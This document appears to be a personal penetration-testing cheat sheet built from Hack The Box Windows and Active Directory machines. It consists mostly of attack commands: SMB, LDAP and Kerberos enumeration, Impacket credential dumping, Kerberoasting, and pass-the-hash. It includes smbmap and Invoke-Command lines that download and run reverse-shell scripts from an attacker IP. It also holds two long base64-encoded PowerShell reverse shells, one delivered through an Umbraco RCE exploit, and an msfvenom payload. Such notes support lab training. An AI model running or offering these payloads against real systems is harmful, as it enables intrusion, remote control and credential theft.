### Index

1.  [Links](#Links)
2. [Nmap](#Nmap)
3.  [Samba](#Samba)
	1. [`Trying to List smb share using Guest account`](#`Trying%20to%20List%20smb%20share%20using%20Guest%20account`)
	2. [`Dumbing Password Policy through SMB Share`](#`Dumbing%20Password%20Policy%20through%20SMB%20Share`)
	3. [`Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share`](#`Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share`)
	4. [`Connecting using smbclient with Credentials`](#`Connecting%20using%20smbclient%20with%20Credentials`)
	5. [`Spidering SMB shares`](#`Spidering%20SMB%20shares`)
	6. [`Listing the SMB Shares without password using smbclient`](#`Listing%20the%20SMB%20Shares%20without%20password%20using%20smbclient`)
	7. [`Listing SMB Share using Password or NTLM hash`](#`Listing%20SMB%20Share%20using%20Password%20or%20NTLM%20hash`)
	8. [`Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share`](#`Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share`)
	9. [`Getting the file from SMB Share without password anonymously`](#`Getting%20the%20file%20from%20SMB%20Share%20without%20password%20anonymously`)
	10. [`Execute Command using smbmap`](#`Execute%20Command%20using%20smbmap`)
	11. [`smbmap - Non Recursive Path Listing`](#`smbmap%20-%20Non%20Recursive%20Path%20Listing`)
	12. [`Get a Reverse shell using smbmap. Make sure python server and nc listener is running.`](#`Get%20a%20Reverse%20shell%20using%20smbmap.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.`) 
3.  [CURL](#CURL)
	1. [Download the file on the target.](#Download%20the%20file%20on%20the%20target.)
4. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
	1. [RCE to Shell](#RCE%20to%20Shell)
	2. [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
	3. [`Using impacket-wmiexec`](#`Using%20impacket-wmiexec`)
	4. [`Using smbclient`](#`Using%20smbclient`)
	5. [`Using Telnet`](#`Using%20Telnet`)
	6. [`Using smbmap to run powershell command`](#`Using%20smbmap%20to%20run%20powershell%20command`)
	7. [`using rpcclient`](#`using%20rpcclient`)
	8. [`Using PowerShell`](#`Using%20PowerShell`)
	9. [`Print File Content using SQL Query (MYSQL)`](#`Print%20File%20Content%20using%20SQL%20Query%20(MYSQL)`)
5.  [PowerShell & Active Directory](#PowerShell%20&%20Active%20Directory)
	1. [`Print all the environment variables using powershell`.](#`Print%20all%20the%20environment%20variables%20using%20powershell`.)
	2. [`Importing PowerSploit and Other modules`](#`Importing%20PowerSploit%20and%20Other%20modules`)
	3. [`Copy the whole PowerSploit Directory as follows`](#`Copy%20the%20whole%20PowerSploit%20Directory%20as%20follows`)
	4. [`Checking the PowerShell history`](#`Checking%20the%20PowerShell%20history`)
	5. [`File Transfer Using PowerShell`](#`File%20Transfer%20Using%20PowerShell`)
6. [LDAP or WinDapSearch](#LDAP%20or%20WinDapSearch)
	1. [`Anonymous Bind`](#`Anonymous%20Bind`)
	2. [`Authenticated Bind`](#`Authenticated%20Bind`)
	3. [`Get Specific User`](#`Get%20Specific%20User`)
	4. [`LDAP With Credentials Enumeration`](#`LDAP%20With%20Credentials%20Enumeration`)
	5. [`ToGether All Commands`](#`ToGether%20All%20Commands`)
7. [WordLists](#WordLists)
	1. [`Windows Path Traversal`](#`Windows%20Path%20Traversal`)
8. [Alternate Data Stream (ADS)](#Alternate%20Data%20Stream%20(ADS))
	1. [`ADS CheckList - CheatSheet`](#`ADS%20CheckList%20-%20CheatSheet`)
9. [Microsoft Access Database Files (MDB Files)](#Microsoft%20Access%20Database%20Files%20(MDB%20Files))
10. [Personal Storage Table (PST Files)](#Personal%20Storage%20Table%20(PST%20Files))
11. [`Impacket`](#`Impacket`)
12. [`Grep`](#`Grep`)
13. [`SSH`](#`SSH`)
14. [`GoBuster & FeroxBuster`](#`GoBuster%20&%20FeroxBuster`)
15. [`wfuzz & ffuf`](#`wfuzz%20&%20ffuf`)
16. [`File Transfer From Kali to Target or Vice Versa`](#`File%20Transfer%20From%20Kali%20to%20Target%20or%20Vice%20Versa`)
	1. [`Using PHP`](#`Using%20PHP`)
17. [`Exploits & CVE Reference - HTB Boxes`](#`Exploits%20&%20CVE%20Reference%20-%20HTB%20Boxes`)
### Links

[LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
[CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
[Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo
[Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.
[Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu
[The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks
[GitHub - OSCP CheatSheet ](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering) - One of the OSCP Cheat Sheet
[OSCP Cheat Sheet](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet) - One more OSCP CheatSheet
[SysInternals Tools EXEs](https://live.sysinternals.com/) - This link contains just Sysinternals Tools (System Internals) EXE file ready to use.
[CTF 101](https://ctf101.org/) - CTF Play Book
[Attacking Active Directory 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/) - In-Detail Active Directory Methods 
### Nmap
```
# nmap -p- -Pn <IP>
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn <IP>
# nmap -p80 --min-rate=1000 --script "http-* and not brute" -sC -sV <IP>
# nmap -p389,636,3268,3269 --min-rate=1000 --script "ldap-* and not brute" -sC -sV <IP>
# Kerberos Enum Users
# nmap -p88,464 --script=krb5-enum-users -sC -sV -T4 -A <IP>
# nmap -p88,464 --script=krb5-enum-users --script-args=krb5-enum-users.realm='intelligence.htb' -sC -sV -T4 10.10.10.248
# nmap -p88,464 --script=krb5-enum-users --script-args=krb5-enum-users.realm='intelligence.htb',userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -sC -sV -T4 10.10.10.248

```
### Samba

###### `Trying to List smb share using Guest account`
```
nmap -p139,445 --min-rate=1000 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-mbenum,smb-os-discovery,smb-print-text,smb-protocols -sC -sV -T4 -A chatterbox.htb
netexec smb 10.10.10.111 -u Guest -p "" --shares 
netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
smbmap -u "guest" -p "" -H 10.10.10.134
smbclient -U guest //10.10.10.134/Backups
```
###### `Dumbing Password Policy through SMB Share`
```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
```
###### `Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share`
```
# smbclient //10.10.11.174/support-tools            
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
```
###### `Connecting using smbclient with Credentials`
```
# smbclient -U 'fabricorp.local/tlavel%Fabricorp01' //10.10.10.193/C$
# smbclient -U 'administrator%Welcome1!' \\\\10.10.10.74\\C$ 
```
###### `Spidering SMB shares`
```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
```
###### `Listing the SMB Shares without password using smbclient`
```
$ smbclient --no-pass -L 10.10.10.134
$ smbclient --no-pass -L //<IP> # Null user
```
###### `Listing SMB Share using Password or NTLM hash`
```
$ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
```
###### `Getting the file from SMB Share without password anonymously`
```
──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
└─# smbclient //10.10.11.174/support-tools -c 'get putty.exe' 
Password for [WORKGROUP\root]:
getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (average 1294.2 KiloBytes/sec)

┌──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
└─# ls                                                        
putty.exe
```
###### `Execute Command using smbmap`
```
# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
	# The `-d` switch can be ignored. 
```
###### `smbmap - Non Recursive Path Listing`
```
# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
```
###### `Get a Reverse shell using smbmap. Make sure python server and nc listener is running.`
```
# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
```


### CURL 

###### Download the file on the target.
```
Start the Python Server on Kali
python -m http.server 80

Run the following Command in Windows if Curl is Installed
curl -o FileName http://Kali_IP/FileName
```

### Ways to Get The Shell

###### RCE to Shell

During the Remote.htb, I had the following scenario.
```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```
###### Getting Shell When you have password

Getting Shell from RCE was achieved as follows
```
## Failed Attempt of using powershell

python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'

## Successful Attempt

$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
$ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'copy //10.10.14.4/a/revshell.exe C:/Windows/Temp/revshell.exe'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/Windows/Temp/revshell.exe' #Make sure the listener is On in another tab
```

During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.

###### `Using impacket-wmiexec`
```
$ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator
```

###### `Using smbclient`
```
$ smbclient -U Administrator \\\\10.10.10.180\\C$
Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
```

###### `Using Telnet`
```
$ telnet access.htb
C:\Users\security>
```

###### `Using smbmap to run powershell command`
```
# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
```

###### `using rpcclient`
```
# rpcclient -U 'bhult%Fabricorp012' 10.10.10.193
```

###### `Using PowerShell`
```
$PSW = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$LOGIN = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc',$PSW)

#Now Use revshell.com and Generate PowerShell V3 (Base64)

Invoke-Command -Computer dc1 -Credential $LOGIN -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=}
```
###### `Print File Content using SQL Query (MYSQL)`
```
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\miscsvc\desktop\user.txt', SINGLE_CLOB) MyFile
```

###### `Nishang - Reverse Shell`
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4444
```
### PowerShell & Active Directory

###### `Print all the environment variables using powershell`.
```
Get-ChildItem env:
```

###### `Importing PowerSploit and Other modules` 
```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Recon
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Privesc
```
Note that I am inside the PowerSploit directory where Recon and Privesc directories are located. Now you can retrieve the command for each module like this.

```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Get-Command -Module Recon
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Add-NetUser                                        3.0.0.0    Recon
```

###### `Copy the whole PowerSploit Directory as follows`
```
*Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
```

###### `Checking the PowerShell history`
```
*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
```

###### `File Transfer Using PowerShell`
```
PS C:\ProgramData> curl -o powercat.ps1 http://10.10.14.2/powercat.ps1
PS C:\ProgramData> powercat -c 10.10.14.2 -p 1234 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe" 
#Start the NetCat Listener using nc -l -p 1234 > FileName.exe
```
### LDAP or WinDapSearch

Alternate tool: [WinDapSearch](https://github.com/ropnop/windapsearch)
###### `Anonymous Bind`
```
ldapsearch -H ldap://athos.host -x -LLL
ldapsearch -H ldap://athos.host -x -LLL -b '' -s base namingContexts
ldapsearch -H ldap://athos.host -x -LLL -b 'dc=athos,dc=host' 'dn'
```
###### `Authenticated Bind`
```
ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
ldapsearch -H ldap://athos.host -D 'cn=admin,dc=athos,dc=host' -w 'p@ssw0rd' -x -LLL -b 'dc=athos,dc=host' 'dn'
```
###### `Get Specific User`
```
ldapsearch -xLLL -H ldaps://<ldap server> -b 'ou=People,dc=metricinsights,dc=com' '(uid=testuser1)' 
```
###### `LDAP With Credentials Enumeration`
```
ldapsearch -xLLL -H ldaps://<ldap server> -D '<ldap credentials username>' -W -b 'CN=Users,DC=metricinsights,DC=com' 'samaccountname=tester1'
```
###### `ToGether All Commands`
```
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```
### WordLists 

###### `Windows Path Traversal` 
-  [Cheatsheet](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9#file-windows-path-traversal-cheatsheet) 

### Alternate Data Stream (ADS)

###### `ADS CheckList - CheatSheet`
- [ADS Cheatsheet](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
- [ADS Check CLSID](https://github.com/tcprks/Rchitect/tree/Yoda/Scripts)

### Microsoft Access Database Files (MDB Files)
```
mdb-tables -1 filename.mdb
mdb-json filename.mdb auth_user
```

### Personal Storage Table (PST Files)
```
# readpst -w Access\ Control.pst
# cat Access\ Control.mbox 
```

### `Impacket`
```
#Group Policy Preference GPP Vulnerability. Active.HTB
impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL

#ASREPROAST Attack
impacket-GetNPUsers -request active.htb/SVC_TGS -no-pass  -dc-ip 10.10.10.100

#OverPass Hash or Pass The Key Attack
impacket-secretsdump active.htb/SVC_TGS@10.10.10.100 -just-dc-user Administrator -just-dc-ntlm

#Kerberoasting Attack
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

#SMB Client Session
impacket-smbclient -port 445 active.htb/Administrator:Ticketmaster1968@10.10.10.100

#Shell using impacket-psexec
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

#Starting the SMB Server with Username and Password and Mounting it on Target
impacket-smbserver a /home/ringbuffer/Downloads/Crafty.htb -smb2support -user lol -pass lol
PS C:\Users\svc_minecraft\server\plugins> net use \\10.10.14.4\a /USER:lol lol
```

### `Grep`
```
#Printing Uncommented Lines from file
grep -v "^#" apache2.conf | grep .

```

### `SSH`
```
#Creating Multiple SSH Tunnel 
sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137 -L 8081:localhost:8080 -L 16030:localhost:16030 -L 2181:localhost:2181 -L 16010:localhost:16010 -L 16020:localhost:16020
```

### `GoBuster & FeroxBuster`
```
# Directory Enumeration
gobuster dir -u http://aero.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#File Enumeration
gobuster dir -u http://aero.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,php,txt,conf,inc,zip
```

### `wfuzz & ffuf`
```
#Subdomain Enumeration
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt --hl 186 -H "Host: FUZZ.aero.htb" -u http://aero.htb
ffuf -H "Host: FUZZ.aero.htb" -u http://aero.htb/ -mc 200 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -fl 187


```

### `File Transfer From Kali to Target or Vice Versa`

[File Transfer Checklist](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
###### `Using PHP`
```
$ php -S 0.0.0.0:8081  # You tried it out in Nibbles.HTB box.
[Sat Sep 28 00:57:33 2024] 10.10.14.8:54430 [200]: /personal.zip
```
### `Exploits & CVE Reference - HTB Boxes`

- Aero.HTB - 
	- CVE-2023-38146 [ThemeBleedPy](https://github.com/Durge5/ThemeBleedPy).  
	- CVE-2023-28253 - [Common Log File System](https://github.com/fortra/CVE-2023-28252?). 
- Arctic.HTB 
	- CVE-2010-2861 [Adobe ColdFusion Directory Traversal Vulnerability](https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2010-2861/README.md#adobe-coldfusion-directory-traversal-vulnerability-cve-2010-2861) 
	- CVE-2009-2265 [FCKedit Vulnerability](https://codewatch.org/2013/12/07/manually-penetrating-the-fckedit-vulnerability-cve-2009-2265/).  
	- [Windows Kernel Exploits](https://github.com/egre55/windows-kernel-exploits) 
	- [CVE-2017-0213: COM Aggregate Marshaler](https://github.com/egre55/windows-kernel-exploits/tree/master/CVE-2017-0213%3A%20COM%20Aggregate%20Marshaler "CVE-2017-0213: COM Aggregate Marshaler") 
	- [MS09-012: Churrasco](https://github.com/egre55/windows-kernel-exploits/tree/master/MS09-012%3A%20Churrasco "MS09-012: Churrasco")
	- [MS10-059: Chimichurri](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri "MS10-059: Chimichurri")
	- [MS16-032: Secondary Logon Handle](https://github.com/egre55/windows-kernel-exploits/tree/master/MS16-032%3A%20Secondary%20Logon%20Handle "MS16-032: Secondary Logon Handle") 
- Bastion.HTB
	- [CVE-2023-30367](https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper) - Multi-Remote Next Generation Connection Manager (mRemoteNG) Password Dumper
- Bounty.HTB
	- [IIS Short File Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
	- Web.config to execute ASPX code and get a reverse shell
	- [Juicypoteto](https://github.com/ohpe/juicy-potato) 
- Chatterbox.HTB
	- [Remote Buffer Overflow](https://www.exploit-db.com/exploits/36025)
- Crafty HTB
	- [Log4j](https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file) 